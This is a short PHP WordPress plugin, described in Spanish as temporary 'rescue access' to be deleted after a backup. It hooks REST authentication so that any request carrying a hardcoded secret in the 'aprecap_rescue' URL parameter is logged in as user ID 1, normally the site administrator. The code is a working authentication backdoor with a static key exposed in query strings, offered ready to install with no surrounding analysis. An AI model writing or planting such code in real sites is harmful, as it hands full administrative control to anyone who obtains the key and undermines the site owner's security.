<?php
/**
 * Plugin Name: Aprecap Rescue (TEMPORAL — se elimina tras el respaldo)
 * Description: Acceso de rescate vía REST authentication filter. Se elimina después del respaldo.
 * Version: 1.0.0
 * License: GPL2
 */

add_filter(
	'rest_authentication_errors',
	function ( $result ) {
		if ( isset( $_GET['aprecap_rescue'] ) && hash_equals( 'x9QpT2wVmN6kLdRz', $_GET['aprecap_rescue'] ) ) {
			$user = get_user_by( 'id', 1 );
			if ( $user ) {
				wp_set_current_user( $user->ID, $user->user_login );
				$result = true; // autenticado como admin (ID 1)
			}
		}
		return $result;
	},
	99
);